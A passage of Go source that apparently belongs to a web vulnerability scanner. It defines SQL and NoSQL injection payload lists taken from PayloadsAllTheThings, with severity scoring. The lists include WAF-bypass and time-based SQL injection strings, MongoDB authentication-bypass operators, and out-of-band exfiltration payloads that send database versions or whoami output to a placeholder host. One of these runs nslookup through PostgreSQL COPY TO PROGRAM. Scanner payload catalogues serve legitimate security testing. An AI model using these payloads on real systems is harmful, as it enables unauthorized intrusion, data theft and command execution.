			safe, DetectReflection, `\w+`, "CWE-89", "A03:2021", 0, []string{"MySQL"}, []string{"waf_bypass"}),
		p("sqli-waf-alt-version", CatSQLi, TechWAFBypass, "Alt VERSION()", `' UNION SELECT 1,@@version,3-- -`,
			"@@version instead of version() â€” WAF bypass for function call filters",
			safe, DetectReflection, `[0-9]+\.[0-9]+`, "CWE-89", "A03:2021", 0, []string{"MySQL", "MSSQL"}, []string{"waf_bypass"}),
	}
}

// â”€â”€â”€â”€ Polyglot (from PayloadsAllTheThings) â”€â”€â”€â”€
func sqliPolyglot() []Payload {
	return []Payload{
		p("sqli-polyglot-sleep", CatSQLi, TechPolyglot, "Polyglot SLEEP", `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`,
			"Multi-context polyglot â€” triggers in both string and numeric contexts",
			active, DetectTimeDelta, ``, "CWE-89", "A03:2021", 1000, nil, []string{"polyglot"}),
		p("sqli-polyglot-routed", CatSQLi, TechPolyglot, "Routed Injection", `' UNION SELECT 1,CONCAT(0x27,UNION SELECT password FROM users-- -`,
			"Routed injection â€” second-order payload inside UNION result",
			safe, DetectReflection, ``, "CWE-89", "A03:2021", 0, nil, []string{"polyglot", "advanced"}),
	}
}

// â”€â”€â”€â”€ OOB Exfiltration (from PayloadsAllTheThings MySQL OOB) â”€â”€â”€â”€
func sqliOOBExfil() []Payload {
	return []Payload{
		p("sqli-oob-mysql-dns-load-file", CatSQLi, TechOOBExfil, "MySQL DNS LOAD_FILE",
			`' AND LOAD_FILE(CONCAT('\\\\',version(),'.VYOMITE_OOB_HOST\\a'))-- -`,
			"MySQL DNS exfiltration via LOAD_FILE UNC path",
			active, DetectOOBCallback, ``, "CWE-89", "A03:2021", 0, []string{"MySQL", "Windows"}, []string{"oob", "exfiltration"}),
		p("sqli-oob-mysql-dns-xmlquery", CatSQLi, TechOOBExfil, "MySQL DNS XML",
			`' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\',version(),'.VYOMITE_OOB_HOST\\')))))-- -`,
			"MySQL XML+LOAD_FILE DNS exfiltration combo",
			active, DetectOOBCallback, ``, "CWE-89", "A03:2021", 0, []string{"MySQL", "Windows"}, []string{"oob", "exfiltration"}),
		p("sqli-oob-mssql-dns", CatSQLi, TechOOBExfil, "MSSQL DNS Exfil",
			`'; EXEC master..xp_dirtree '\\VYOMITE_OOB_HOST\a'-- -`,
			"MSSQL xp_dirtree UNC path for DNS exfiltration",
			active, DetectOOBCallback, ``, "CWE-89", "A03:2021", 0, []string{"MSSQL"}, []string{"oob", "exfiltration"}),
		p("sqli-oob-oracle-http", CatSQLi, TechOOBExfil, "Oracle HTTP Request",
			`' AND 1=UTL_HTTP.REQUEST('http://VYOMITE_OOB_HOST/'||(SELECT banner FROM v$version WHERE ROWNUM=1))-- -`,
			"Oracle UTL_HTTP.REQUEST for HTTP-based OOB exfiltration",
			active, DetectOOBCallback, ``, "CWE-89", "A03:2021", 0, []string{"Oracle"}, []string{"oob", "exfiltration"}),
		p("sqli-oob-pgsql-copy", CatSQLi, TechOOBExfil, "PostgreSQL COPY TO PROGRAM",
			`'; COPY (SELECT version()) TO PROGRAM 'nslookup $(whoami).VYOMITE_OOB_HOST'-- -`,
			"PostgreSQL COPY TO PROGRAM â€” DNS-based OOB via nslookup",
			active, DetectOOBCallback, ``, "CWE-89", "A03:2021", 0, []string{"PostgreSQL"}, []string{"oob", "exfiltration"}),
	}
}

// â”€â”€â”€â”€ NoSQL Injection (from PayloadsAllTheThings NoSQL Injection) â”€â”€â”€â”€
func NoSQLiPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatNoSQLi,
		Description: "NoSQL Injection â€” PayloadsAllTheThings + CWE-943",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection",
		Payloads: []Payload{
			p("nosqli-ne", CatNoSQLi, TechClassic, "MongoDB $ne Bypass", `{"$ne":""}`,
				"MongoDB $ne operator â€” matches all non-empty values",
				safe, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql", "auth_bypass"}),
			p("nosqli-gt", CatNoSQLi, TechClassic, "MongoDB $gt Bypass", `{"$gt":""}`,
				"MongoDB $gt operator â€” matches all strings greater than empty",
				safe, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql", "auth_bypass"}),
			p("nosqli-regex", CatNoSQLi, TechClassic, "MongoDB $regex", `{"$regex":".*"}`,
				"MongoDB $regex wildcard â€” matches all documents",
				safe, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql"}),
			p("nosqli-where-true", CatNoSQLi, TechClassic, "MongoDB $where True", `{"$where":"1==1"}`,
				"MongoDB $where JavaScript expression â€” always true",
				safe, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql"}),
			p("nosqli-where-sleep", CatNoSQLi, TechTimeBlind, "MongoDB $where Sleep",
				`{"$where":"sleep(5000)||1==1"}`,
				"MongoDB $where JavaScript sleep â€” time-based blind NoSQLi",
				active, DetectTimeDelta, ``, "CWE-943", "A03:2021", 5000, []string{"MongoDB"}, []string{"nosql", "time_blind"}),
			p("nosqli-js-inject", CatNoSQLi, TechClassic, "MongoDB JS Injection", `'; return true; var x='`,
				"Server-side JavaScript injection in $where clause",
				active, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql", "js_injection"}),
			p("nosqli-url-ne", CatNoSQLi, TechClassic, "URL Param $ne", `username[$ne]=&password[$ne]=`,
				"URL parameter NoSQL injection â€” brackets notation",
				safe, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql", "url_param"}),
			p("nosqli-json-or", CatNoSQLi, TechAuthBypass, "JSON $or Auth Bypass",
				`{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$ne":""}}`,
				"MongoDB $or operator for multi-user auth bypass",
				safe, DetectContentDiff, ``, "CWE-943", "A03:2021", 0, []string{"MongoDB"}, []string{"nosql", "auth_bypass"}),
		},
	}
}

// â”€â”€â”€â”€ Helper function for compact payload construction â”€â”€â”€â”€
const (
	safe   = true
	active = false
)

func p(id string, cat PayloadCategory, tech Technique, name, value, desc string,
	safeMode bool, detection DetectionMethod, signature string,
	cwe, owasp string, delayMs int, stack []string, tags []string) Payload {
	severity := SevHigh
	cvss := 7.5
	switch cat {
	case CatSQLi, CatCMDi, CatSSTI, CatInsecureDeserial:
		severity = SevCritical; cvss = 9.8
	case CatXXE:
		severity = SevCritical; cvss = 9.1
	case CatSSRF:
		severity = SevHigh; cvss = 8.6
	case CatXSS, CatPathTraversal:
		severity = SevHigh; cvss = 7.5
	case CatNoSQLi, CatLDAPi:
		severity = SevHigh; cvss = 8.1
	case CatCRLF, CatHeaderInjection, CatHostHeader:
		severity = SevMedium; cvss = 5.4
	case CatOpenRedirect:
		severity = SevMedium; cvss = 4.3
	}

	contexts := []InjectionContext{CtxURLQuery, CtxFormBody}
	if cat == CatXXE {
		contexts = []InjectionContext{CtxXMLBody}
	}

	return Payload{
		ID: id, Category: cat, Technique: tech, Name: name, Value: value,
		Description: desc, Contexts: contexts, Detection: detection,
		DetectSignature: signature, DelayMs: delayMs,
		Severity: severity, SafeMode: safeMode, TargetStack: stack,
		CWE: cwe, OWASPCategory: owasp, CVSSScore: cvss,
		Reference: "PayloadsAllTheThings", Tags: tags, Enabled: true,
	}
}
